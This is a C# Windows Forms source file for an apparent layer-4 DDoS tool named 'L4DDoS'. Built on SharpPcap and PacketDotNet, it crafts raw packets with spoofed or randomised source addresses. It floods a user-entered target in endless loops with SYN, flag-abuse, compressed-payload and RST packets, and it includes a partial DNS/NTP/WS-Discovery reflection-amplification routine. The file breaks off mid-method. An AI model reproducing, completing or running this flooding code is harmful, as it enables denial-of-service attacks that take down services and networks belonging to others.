using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Net.Sockets;
using M15A3_MCWS.Properties;
using System.IO.Compression;
using System.Threading;
using System.Threading.Tasks;
using System.Text;
using Noemax.Compression;
using System.Reflection;
using System.Runtime.Intrinsics.Arm;
using Noemax.Lzma;
using Nmap.NET.Container;
using NetTools;

namespace M15A3_MCWS
{
    public partial class L4DDoS : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
(
    int nLeftRect,     // x-coordinate of upper-left corner
    int nTopRect,      // y-coordinate of upper-left corner
    int nRightRect,    // x-coordinate of lower-right corner
    int nBottomRect,   // y-coordinate of lower-right corner
    int nWidthEllipse, // width of ellipse
    int nHeightEllipse // height of ellipse
);
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public L4DDoS()
        {
            InitializeComponent();
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 25, 25));
        }
        int x;
        string name;
        PhysicalAddress admac;
        string id;
        string desc;
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        public static IPAddress randipv6()
        {
            byte[] b = new byte[16];
            Random random = new Random();
            random.NextBytes(b);
            IPAddress ipv6 = new IPAddress(b);
            return ipv6;

        }
        public IPAddress randip()
        {
            Random r = new Random();
            string ips = $"{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}";
            IPAddress ipa = IPAddress.Parse(ips);
            return ipa;
        }
        private void pictureBox3_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        private void stuka()
        {
            IPAddress ipa = IPAddress.Parse(textBox1.Text);
            Random r = new Random();
            TcpPacket tcp = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp.Push = true;
            tcp.Urgent = true;
            tcp.Synchronize = true;
            TcpPacket o = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            o.Push = true;
            o.Urgent = true;
            o.Synchronize = true;
            o.Finished = true;
            byte[] n = Encoding.ASCII.GetBytes(new string('2', 65535));
            CompressionFactory cf = CompressionFactory.Lzma;
            byte[] nplus = cf.Compress(n, 9);
            o.PayloadData = nplus;
            byte[] petn = cf.Compress(o.Bytes, 9);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            ep.PayloadData = petn;
            IPv6Packet ip6 = new IPv6Packet(randipv6(), IPAddress.Parse(textBox1.Text));
            IPv4Packet ip = new IPv4Packet(randip(), IPAddress.Parse(textBox1.Text));
            tcp.PayloadData = petn;
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
                dev.SendPacket(ep);
            }
        }
        private void ac48(ILiveDevice dev, IPAddress ipa, ushort sport, ushort dport, string[] ntpservers, string[] dnsservers, string[] wsdreflect)
        {
            EthernetPacket ep = new EthernetPacket(dev.MacAddress, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                Random r = new Random();
                IPv4Packet ip = new IPv4Packet(randip(), ipa);
                IPv4Packet ampl = new IPv4Packet(ipa, IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]));
                IPv4Packet ntp = new IPv4Packet(ipa, IPAddress.Parse(ntpservers[r.Next(ntpservers.Length)]));
                IPv4Packet dns = new IPv4Packet(ipa, IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]));
                IPv4Packet wsd = new IPv4Packet(ipa, IPAddress.Parse(ntpservers[r.Next(wsdreflect.Length)]));
                UdpPacket ws = new UdpPacket((ushort)r.Next(49152, 65535), 3702);
                ws.PayloadData = Encoding.UTF8.GetBytes(@"<tds:GetServices />");
                UdpPacket dn = new UdpPacket((ushort)r.Next(49152, 65535), 53);
                dn.PayloadData = Encoding.UTF8.GetBytes(@"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff" + @"\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00");
                UdpPacket nt = new UdpPacket((ushort)r.Next(49152, 65535), 123);
                nt.PayloadData = Encoding.UTF8.GetBytes(@"\x17\x00\x03\x2a\x00\x00\x00\x00");
                TcpPacket tcp = new TcpPacket(sport, dport);
                var t1 = new TcpPacket(sport, dport);
                var t2 = new TcpPacket(sport, dport);
                var t3 = new TcpPacket(sport, dport);
                var t4 = new TcpPacket(sport, dport);
                var t5 = new TcpPacket(sport, dport);
                var t6 = new TcpPacket(sport, dport);
                var t7 = new TcpPacket(sport, dport);
                ntp.PayloadPacket = nt;
                dns.PayloadPacket = dn;
                wsd.PayloadPacket = ws;
                tcp.Synchronize = true;
                t1.Synchronize = true; t2.Synchronize = true;
                t3.Synchronize = true; t4.Synchronize = true;
                t5.Synchronize = true; t6.Synchronize = true;
                t5.PayloadPacket = t6;
                t4.PayloadPacket = t5;
                t2.PayloadPacket = t3;
                t1.PayloadPacket = t2;
                tcp.PayloadPacket = t1;
                ip.PayloadPacket = tcp;
            }
        }
        int i = 0;
        private void L4DDoS_Load(object sender, EventArgs e)
        {
            try
            {
                this.AutoScaleMode = AutoScaleMode.Dpi;
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        desc = n.Description;
                        id = n.Id;
                        break;
                    }
                    else
                    {
                        x++;
                    }
                }
                foreach (ILiveDevice d in cdl)
                {
                    if (d.MacAddress == admac && d.Name == name)
                    {
                        dev = d;
                    }
                }
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox3.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        string[] a10s;
        private void ps2(ILiveDevice dev, IPAddress ipa, ushort sport, ushort dport)
        {

            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(randip(), ipa);
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            TcpPacket tcp = new TcpPacket(sport, dport);
            var t1 = new TcpPacket(sport, dport);
            var t2 = new TcpPacket(sport, dport);
            var t3 = new TcpPacket(sport, dport);
            var t4 = new TcpPacket(sport, dport);
            var t5 = new TcpPacket(sport, dport);
            var t6 = new TcpPacket(sport, dport);
            var t7 = new TcpPacket(sport, dport);
            tcp.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp.PayloadPacket = t1;
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
        }
        private void vx6(ILiveDevice dev)
        {
            Random r = new Random();
            TcpPacket tcp = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp.Push = true;
            tcp.Urgent = true;
            tcp.Synchronize = true;
            TcpPacket tcp1 = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp1.Push = true;
            tcp1.Urgent = true;
            tcp1.Synchronize = true;
            tcp1.Finished = true;
            TcpPacket tcp2 = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp2.Push = true;
            tcp2.Urgent = true;
            tcp2.Synchronize = true;
            tcp2.Reset = true;
            byte[] pcl3 = tcp.Bytes;
            byte[] ethanol = tcp1.Bytes;
            byte[] sulfur = tcp2.Bytes;
            CompressionFactory transester = CompressionFactory.Lzma;
            byte[] racemate = transester.Compress(pcl3, 9);
            byte[] ch3pcl2 = transester.Compress(ethanol, 9);
            byte[] dipa = transester.Compress(sulfur, 9);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            ep.PayloadData = racemate;
            IPv6Packet ip = new IPv6Packet(randipv6(), IPAddress.Parse(textBox1.Text));
            ip.TimeToLive = 255;
            ip.Protocol = PacketDotNet.ProtocolType.Reserved254;
            ip.PayloadData = ch3pcl2;
            IcmpV6Packet icmpv4 = new IcmpV6Packet(new PacketDotNet.Utils.ByteArraySegment(dipa));
            icmpv4.PayloadData = dipa;
            ep.PayloadPacket = ip;
            ip.PayloadPacket = icmpv4;
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randipv6();
                }
                dev.SendPacket(ep);
            }
        }
        private void vx4(ILiveDevice dev)
        {
            Random r = new Random();
            TcpPacket tcp = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp.Push = true;
            tcp.Urgent = true;
            tcp.Synchronize = true;
            TcpPacket tcp1 = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp1.Push = true;
            tcp1.Urgent = true;
            tcp1.Synchronize = true;
            tcp1.Finished = true;
            TcpPacket tcp2 = new TcpPacket(ushort.Parse(r.Next(0, 65535).ToString()), ushort.Parse(r.Next(0, 65535).ToString()));
            tcp2.Push = true;
            tcp2.Urgent = true;
            tcp2.Synchronize = true;
            tcp2.Reset = true;
            byte[] pcl3 = tcp.Bytes;
            byte[] ethanol = tcp1.Bytes;
            byte[] sulfur = tcp2.Bytes;
            CompressionFactory transester = CompressionFactory.Lzma;
            byte[] racemate = transester.Compress(pcl3, 9);
            byte[] ch3pcl2 = transester.Compress(ethanol, 9);
            byte[] dipa = transester.Compress(sulfur, 9);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            ep.PayloadData = racemate;
            IPv4Packet ip = new IPv4Packet(randip(), IPAddress.Parse(textBox1.Text));
            ip.TimeToLive = 255;
            ip.Protocol = PacketDotNet.ProtocolType.Reserved254;
            ip.PayloadData = ch3pcl2;
            IcmpV4Packet icmpv4 = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(dipa));
            icmpv4.PayloadData = dipa;
            ep.PayloadPacket = ip;
            ip.PayloadPacket = icmpv4;
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
                dev.SendPacket(ep);
            }
        }
        private char randchar()
        {
            string ascii = "$%#@!*abcdefghijklmnopqrstuvwxyz1234567890?;:ABCDEFGHIJKLMNOPQRSTUVWXYZ^&";
            Random r = new Random();
            char c = ascii[r.Next(0, ascii.Length)];
            return c;
        }
        private void nape(IPAddress ipa, ushort sport, ushort dport, byte[] f, int ttl, string msg)
        {
            dev.Open();
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(sp, ipa);
            ip.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            var t1 = new TcpPacket(soport, deport);
            var t2 = new TcpPacket(soport, deport);
            var t3 = new TcpPacket(soport, deport);
            var t4 = new TcpPacket(soport, deport);
            var t5 = new TcpPacket(soport, deport);
            var t6 = new TcpPacket(soport, deport);
            tcp.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp.PayloadPacket = t1;
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
                dev.SendPacket(ep);
            }
        }
        private void a10(IPAddress ipa, ushort sport, ushort dport, byte[] f, int ttl)
        {
            dev.Open();
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(sp, ipa);
            ip.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            tcp.Reset = true;
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            tcp.Synchronize = false;
            if (textBox2.Text == "")
            {
                while (true)
                {
                    if (textBox2.Text == "")
                    {
                        int x = 0;
                        if (a10s != null)
                        {
                            foreach (string s in a10s)
                            {
                                x++;
                                ip.SourceAddress = IPAddress.Parse(s);
                                ip6.SourceAddress = IPAddress.Parse(s);
                                tcp.SourcePort = ushort.Parse(new Random().Next(0, 65535).ToString());
                                tcp.DestinationPort = (ushort)x;
                                ip.SourceAddress = IPAddress.Parse(s);
                                dev.SendPacket(ep);
                            }
                        }
                        else
                        {
                            IPAddressRange ipr = IPAddressRange.Parse($"{ipa.ToString()}/24");
                            foreach (IPAddress s in ipr)
                            {
                                x++;
                                ip.SourceAddress = s;
                                ip6.SourceAddress = s;
                                tcp.SourcePort = ushort.Parse(new Random().Next(0, 65535).ToString());
                                tcp.DestinationPort = (ushort)x;
                                dev.SendPacket(ep);
                            }
                        }
                        if (x >= 65535)
                        {
                            x = 0;
                        }
                    }
                    else
                    {
                        string[] pors = textBox2.Text.Split(',');
                        List<int> ports = new List<int>();
                        foreach (string p in pors)
                        {
                            int x = int.Parse(p);
                            ports.Add(x);
                        }
                        if (a10s != null)
                        {
                            foreach (string s in a10s)
                            {
                                foreach (int x in ports)
                                {
                                    ip.SourceAddress = IPAddress.Parse(s);
                                    ip6.SourceAddress = IPAddress.Parse(s);
                                    tcp.SourcePort = ushort.Parse(new Random().Next(1024, 65535).ToString());
                                    tcp.DestinationPort = (ushort)x;
                                    ip.SourceAddress = IPAddress.Parse(s);
                                    dev.SendPacket(ep);
                                }
                            }
                        }
                        else
                        {
                            IPAddressRange ipr = IPAddressRange.Parse($"{ipa.ToString()}/24");
                            foreach (IPAddress s in ipr)
                            {
                                foreach (int x in ports)
                                {
                                    ip.SourceAddress = s;
                                    ip6.SourceAddress = s;
                                    tcp.SourcePort = ushort.Parse(new Random().Next(1024, 65535).ToString());
                                    tcp.DestinationPort = (ushort)x;
                                    dev.SendPacket(ep);
                                }
                            }
                        }
                        if (x >= 65535)
                        {
                            x = 0;
                        }
                    }
                }
            }
            else
            {
                string[] ps = textBox2.Text.Split(',');
                List<int> ports = new List<int>();
                foreach (string p in ps)
                {
                    ports.Add(int.Parse(p));
                }
                while (true)
                {
                    if (a10s != null)
                    {
                        foreach (int p in ports)
                        {
                            foreach (string s in a10s)
                            {
                                ip.SourceAddress = IPAddress.Parse(s);
                                ip6.SourceAddress = IPAddress.Parse(s);
                                tcp.SourcePort = ushort.Parse(new Random().Next(1024, 65535).ToString());
                                tcp.DestinationPort = (ushort)p;
                                ip.SourceAddress = IPAddress.Parse(s);
                                dev.SendPacket(ep);
                            }
                        }
                    }
                    else
                    {
                        IPAddressRange ipr = IPAddressRange.Parse($"{ipa.ToString()}/24");
                        foreach (int p in ports)
                        {
                            foreach (IPAddress s in ipr)
                            {
                                x++;
                                ip.SourceAddress = s;
                                ip6.SourceAddress = s;
                                tcp.SourcePort = ushort.Parse(new Random().Next(1024, 65535).ToString());
                                tcp.DestinationPort = (ushort)p;
                                dev.SendPacket(ep);
                            }
                        }
                    }
                    if (x >= 65535)
                    {
                        x = 0;
                    }
                }
            }
        }
        private void ps(IPAddress ipa, ushort sport, ushort dport, int size, int nsize, ushort ttl, string msg)
        {
            dev.Open();
            char oil = randchar();
            byte[] plastic = Encoding.ASCII.GetBytes(new string(oil, size));
            byte[] tip = LzmaCompression.Lzma.Compress(plastic, 9);
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(sp, ipa);
            ip.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            var t1 = new TcpPacket(soport, deport);
            var t2 = new TcpPacket(soport, deport);
            var t3 = new TcpPacket(soport, deport);
            var t4 = new TcpPacket(soport, deport);
            var t5 = new TcpPacket(soport, deport);
            var t6 = new TcpPacket(soport, deport);
            tcp.Synchronize = true;
            tcp.PayloadData = tip;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp.PayloadPacket = t1;
            byte[] bullet = LzmaCompression.Lzma.Compress(ep.Bytes, 9);
            ip.PayloadData = bullet;
            ip6.PayloadData = bullet;
            while (true)
            {
                while (true)
                {
                    if (checkBox2.Checked)
                    {
                        tcp.SourcePort = (ushort)new Random().Next(65535);
                    }
                    if (rp.Checked)
                    {
                        tcp.DestinationPort = (ushort)new Random().Next(65535);
                    }
                    if (rip.Checked)
                    {
                        ip.SourceAddress = randip();
                    }
                    dev.SendPacket(ep.Bytes);
                }
            }
        }
        private void tos1(IPAddress ipa, ushort sport, ushort dport, int size, int nsize, ushort ttl, string msg)
        {
            dev.Open();
            IPAddress r = randip();
            IPAddress r6 = randipv6();
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            ushort soport = ushort.Parse(sport.ToString());
            IPv4Packet ip = new IPv4Packet(ipa, r);
            IPv6Packet ip6 = new IPv6Packet(ipa, r6);
            ip.TimeToLive = ttl;
            ushort spor = ushort.Parse(sportbox.Text);
            ip6.TimeToLive = ttl;
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            tcp.Synchronize = true;
            EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip1 = new IPv4Packet(r, ipa);
            IPv6Packet ip61 = new IPv6Packet(r6, ipa);
            ip1.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            var tcp1 = new TcpPacket(soport, deport);
            tcp1.Acknowledgment = true;
            Random r7 = new Random();
            tcp1.Synchronize = true;
            EthernetPacket ep2 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip2 = new IPv4Packet(ipa, r);
            IPv6Packet ip62 = new IPv6Packet(ipa, r6);
            ip2.TimeToLive = ttl;
            ip62.TimeToLive = ttl;
            var tcp2 = new TcpPacket(soport, deport);
            tcp2.Acknowledgment = true;
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
                ip1.PayloadPacket = tcp1;
                ep1.PayloadPacket = ip1;
                ip2.PayloadPacket = tcp2;
                ep2.PayloadPacket = ip2;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
                ip61.PayloadPacket = tcp1;
                ep1.PayloadPacket = ip61;
                ip62.PayloadPacket = tcp2;
                ep2.PayloadPacket = ip62;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                while (true)
                {
                    spor = ushort.Parse(r7.Next(49152, 65535).ToString());
                    tcp.SourcePort = spor;
                    tcp2.SourcePort = spor;
                    r = randip();
                    ip.SourceAddress = r;
                    ip.DestinationAddress = ipa;
                    ip1.SourceAddress = ipa;
                    ip1.DestinationAddress = r;
                    ip2.SourceAddress = r;
                    ip2.DestinationAddress = ipa;
                    dev.SendPacket(ep);
                    dev.SendPacket(ep1);
                    dev.SendPacket(ep2);
                }
            }
        }
        private void kasapanos(IPAddress ipa, IPPacket ip, ushort sport, int ttl, ushort dport, EthernetPacket ep, TcpPacket tcp)
        {
            byte[] blastyield = new byte[655350];
            byte[] triamine = CompressionFactory.Deflate.Compress(blastyield, 9);
            byte[] n = CompressionFactory.Lzma.Compress(triamine, 9);
            byte[] no2 = CompressionFactory.GZip.Compress(n, 9);
            byte[] o2n = CompressionFactory.BZip2.Compress(no2, 9);
            byte[] benzene = CompressionFactory.Lzf4.Compress(o2n, 9);
            byte[] rdx = CompressionFactory.Zlib.Compress(benzene, 9);
            dev.Open();
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip1 = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            ip1.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ip1.PayloadData = rdx;
            ip6.PayloadData = rdx;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp1 = new TcpPacket(soport, deport);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip1.PayloadPacket = tcp1;
                ep1.PayloadPacket = ip1;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp1;
                ep1.PayloadPacket = ip6;
            }
            var t1 = new TcpPacket(soport, deport);
            var t2 = new TcpPacket(soport, deport);
            var t3 = new TcpPacket(soport, deport);
            var t4 = new TcpPacket(soport, deport);
            var t5 = new TcpPacket(soport, deport);
            var t6 = new TcpPacket(soport, deport);
            tcp1.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp1.PayloadPacket = t1;
            t1.PayloadData = rdx;
            t6.PayloadData = rdx;
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
                dev.SendPacket(ep1);
            }
        }
        private void l2023(IPAddress ipa, ushort sport, ushort dport, int size, int nsize, ushort ttl, string msg)
        {
            dev.Open();
            char oil = randchar();
            byte[] plastic = Encoding.ASCII.GetBytes(new string(oil, size));
            Stream s = new MemoryStream(plastic);
            byte[] gz = CompressionFactory.Lzma.Compress(s, 9);
            byte[] zl = CompressionFactory.Zlib.Compress(gz, 9);
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            ip.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            var t1 = new TcpPacket(soport, deport);
            var t2 = new TcpPacket(soport, deport);
            var t3 = new TcpPacket(soport, deport);
            var t4 = new TcpPacket(soport, deport);
            var t5 = new TcpPacket(soport, deport);
            var t6 = new TcpPacket(soport, deport);
            var t7 = new TcpPacket(soport, deport);
            var t8 = new TcpPacket(soport, deport);
            var t9 = new TcpPacket(soport, deport);
            var t10 = new TcpPacket(soport, deport);
            var t11 = new TcpPacket(soport, deport);
            var t12 = new TcpPacket(soport, deport);
            var t13 = new TcpPacket(soport, deport);
            var t14 = new TcpPacket(soport, deport);
            var t15 = new TcpPacket(soport, deport);
            var t16 = new TcpPacket(soport, deport);
            var t17 = new TcpPacket(soport, deport);
            tcp.Synchronize = true;
            tcp.PayloadData = zl;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t7.Synchronize = true; t8.Synchronize = true;
            t9.Synchronize = true; t10.Synchronize = true;
            t10.Synchronize = true; t11.Synchronize = true;
            t13.Synchronize = true; t14.Synchronize = true;
            t15.Synchronize = true; t16.Synchronize = true;
            t17.Synchronize = true; t12.Synchronize = true;
            t2.Reset = true;
            t3.Urgent = true;
            t4.Push = true;
            t4.Urgent = true;
            t5.Push = true;
            t7.Finished = true;
            t16.PayloadPacket = t17;
            t15.PayloadPacket = t16;
            t14.PayloadPacket = t15;
            t12.PayloadPacket = t13;
            t11.PayloadPacket = t12;
            t10.PayloadPacket = t11;
            t8.PayloadPacket = t9;
            t7.PayloadPacket = t8;
            t6.PayloadPacket = t7;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp.PayloadPacket = t1;
            Stream s1 = new MemoryStream(ep.Bytes);
            byte[] nape = CompressionFactory.BZip2.Compress(s1, 9);
